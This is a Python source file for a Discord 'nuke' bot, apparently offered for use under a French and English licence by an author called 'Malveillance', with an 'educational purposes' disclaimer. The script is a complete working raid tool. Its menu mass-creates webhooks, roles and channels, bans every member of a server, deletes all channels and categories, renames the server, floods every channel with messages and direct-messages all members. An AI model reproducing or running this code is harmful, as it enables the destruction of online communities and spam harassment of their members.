# ============================================
# LICENCE D'UTILISATION
# ============================================
# Ce code est protégé par des droits d'auteur et est destiné à un usage personnel uniquement. 
# Vous n'êtes pas autorisé à le modifier, le distribuer, le vendre, ou à en faire des copies à des fins commerciales sans l'autorisation explicite de l'auteur.
# Toute tentative de modification, de revente, ou de redistribution du code sans permission constitue une violation de cette licence et pourra entraîner des poursuites judiciaires.
# 
# Propriétaire du code : Malveillance
# Version : 3.2
# Copyright © 2025
# ============================================



# ============================================
# USAGE LICENSE
# ============================================
# This code is copyrighted and intended for personal use only. 
# You are not allowed to modify, distribute, sell, or make copies of it for commercial purposes without explicit permission from the author.
# Any attempt to modify, resell, or redistribute the code without permission constitutes a breach of this license and may result in legal action.
# 
# Code Owner: Malveillance
# Version: 3.2
# Copyright © 2025
# ============================================






#Ce code est a but éducatif, tout usage malveillant ne sera en aucun cas de la faute de l'auteur
#This code is for educational purposes, any malicious use will in no way be the fault of the author.



import discord
from discord.ext import commands
from pystyle import Colorate, Colors, Write
import os
import asyncio
import datetime

bot_token = Write.Input("Enter Bot Token: ", Colors.rainbow, interval=0.05)
server_id = int(Write.Input("Enter Server ID: ", Colors.rainbow, interval=0.05))

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def display_logo():
    logo = """
                                       

               ███▄▄▄▄   ███    █▄     ▄█   ▄█▄    ▄████████  ▄████████  ▄██████▄     ▄████████ ████████▄  
               ███▀▀▀██▄ ███    ███   ███ ▄███▀   ███    ███ ███    ███ ███    ███   ███    ███ ███   ▀███ 
               ███   ███ ███    ███   ███▐██▀     ███    █▀  ███    █▀  ███    ███   ███    ███ ███    ███ 
               ███   ███ ███    ███  ▄█████▀     ▄███▄▄▄     ███        ███    ███  ▄███▄▄▄▄██▀ ███    ███ 
               ███   ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀     ███        ███    ███ ▀▀███▀▀▀▀▀   ███    ███ 
               ███   ███ ███    ███   ███▐██▄     ███    █▄  ███    █▄  ███    ███ ▀███████████ ███    ███ 
               ███   ███ ███    ███   ███ ▀███▄   ███    ███ ███    ███ ███    ███   ███    ███ ███   ▄███ 
                ▀█   █▀  ████████▀    ███   ▀█▀   ██████████ ████████▀   ▀██████▀    ███    ███ ████████▀  
                    ▀                                              ███    ███            


                                             

                                             ___________________    . , ; .
                                            (___________________|~~~~~.;' .
                                                                    ' `" ' `

"""
    print(Colorate.Horizontal(Colors.rainbow, logo, 1))

async def main_menu():
    clear()
    display_logo()

    menu = """
                       ╔═════════════════════════════════════════════════════════════╗
                       ║ [1] Webhook Create                      [6] Create Channels ║
                       ║ [2] Role Create                         [7] Send Message    ║
                       ║ [3] Webhook Delete                      [8] Clear Server    ║
                       ║ [4] Role Delete                         [9] Change Name     ║
                       ║ [5] Ban Members                         [10] DM All         ║
                       ║ [11] EXIT                               [00] Contact        ║
                       ╚═════════════════════════════════════════════════════════════╝
    """

    print(Colorate.Horizontal(Colors.rainbow, menu, 1))

    choice = input(Colorate.Horizontal(Colors.blue_to_purple, "[>] Enter your choice: ", 1))

    if choice == "1":
        amount = int(input(Colorate.Horizontal(Colors.blue_to_purple, "Number of webhooks to create: ", 1)))
        await create_webhooks(amount)
    elif choice == "2":
        amount = int(input(Colorate.Horizontal(Colors.blue_to_purple, "Number of roles to create: ", 1)))
        await create_roles(amount)
    elif choice == "3":
        await delete_webhooks()
    elif choice == "4":
        await delete_roles()
    elif choice == "5":
        reason = input(Colorate.Horizontal(Colors.blue_to_purple, "Reason for ban: ", 1))
        await ban_members(reason)
    elif choice == "6":
        channel_type = input(Colorate.Horizontal(Colors.blue_to_purple, "[1] Voice [2] Text: ", 1))
        amount = int(input(Colorate.Horizontal(Colors.blue_to_purple, "Number of channels to create: ", 1)))
        await create_channels(channel_type, amount)
    elif choice == "7":
        amount = int(input(Colorate.Horizontal(Colors.blue_to_purple, "Number of messages to send: ", 1)))
        await send_messages(amount)
    elif choice == "8":
        await clear_server()
    elif choice == "9":
        new_name = input(Colorate.Horizontal(Colors.blue_to_purple, "New server name: ", 1))
        await change_server_name(new_name)
    elif choice == "10":
        await dm_all()
    elif choice == "11":
        print(Colorate.Horizontal(Colors.red_to_yellow, "Exiting...", 1))
        await bot.close()
        return
    elif choice == "00":
        os.system("start https://discord.com/invite/uN9vAvCYCy")

    input(Colorate.Horizontal(Colors.blue_to_purple, "Press Enter to return to menu...", 1))
    await main_menu()
    
async def create_webhooks(amount):
    guild = bot.get_guild(server_id)
    if guild is None:
        print("Invalid server ID.")
        return
    for channel in guild.text_channels:
        for _ in range(amount):
            try:
                await channel.create_webhook(name="Nuke Webhook")
            except Exception as e:
                print(f"Error creating webhook: {e}")
    print("Webhooks created successfully.")

async def create_roles(amount):
    guild = bot.get_guild(server_id)
    if guild is None:
        print("Invalid server ID.")
        return
    name = input("Roles Name: ")
    for _ in range(amount):
        try:
            await guild.create_role(name=name)
        except Exception as e:
            print(f"Error creating role: {e}")
    print("Roles created successfully.")

async def delete_webhooks():
    guild = bot.get_guild(server_id)
    if guild is None:
        print("Invalid server ID.")
        return
    for channel in guild.text_channels:
        webhooks = await channel.webhooks()
        for webhook in webhooks:
            try:
                await webhook.delete()
            except Exception as e:
                print(f"Error deleting webhook: {e}")
    print("All webhooks deleted.")

async def ban_members(reason):
    guild = bot.get_guild(server_id)
    if guild is None:
        print("Invalid server ID.")
        return
    for member in guild.members:
        try:
            await member.ban(reason=reason)
        except Exception as e:
            print(f"Error banning member: {e}")
    print("All members banned.")

async def create_channels(channel_type, amount):
    guild = bot.get_guild(server_id)
    if guild is None:
        print("Invalid server ID.")
        return
    name = input("Channel Name: ")
    for _ in range(amount):
        try:
            if channel_type == "1":
                await guild.create_voice_channel(name)
            elif channel_type == "2":
                await guild.create_text_channel(name)
        except Exception as e:
            print(f"Error creating channel: {e}")
    print("Channels created successfully.")

async def send_messages(amount):
    guild = bot.get_guild(server_id)
    if guild is None:
        print("Invalid server ID.")
        return

    message = input("Message: ")

    tasks = []

    for channel in guild.text_channels:
        for _ in range(amount):
            tasks.append(channel.send(message))

    results = await asyncio.gather(*tasks, return_exceptions=True)

    for result in results:
        if isinstance(result, Exception):
            print(f"Error sending message: {result}")

    print("Messages sent successfully.")

async def clear_server():
    guild = bot.get_guild(server_id)
    if guild is None:
        print("Invalid server ID.")
        return
    for category in guild.categories:
        try:
            await category.delete()
        except Exception as e:
            print(f"Error deleting category: {e}")
    for channel in guild.text_channels + guild.voice_channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Error deleting channel: {e}")
    try:
        await guild.edit(name=f"Server of {guild.owner.name}")
    except Exception as e:
        print(f"Error editing server name: {e}")
    print("Server cleared.")

async def change_server_name(new_name):
    guild = bot.get_guild(server_id)
    if guild is None:
        print("Invalid server ID.")
        return
    try:
        await guild.edit(name=new_name)
    except Exception as e:
        print(f"Error changing server name: {e}")
    print(f"Server name changed to {new_name}.")

async def dm_all():
    guild = bot.get_guild(server_id)
    if guild is None:
        print("Invalid server ID.")
        return
    message = input("Message: ")
    for member in guild.members:
        try:
            await member.send(message)
        except Exception as e:
            print(f"Error sending DM to member: {e}")
    print("Messages sent to all members.")

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    await main_menu()

bot.run(bot_token)
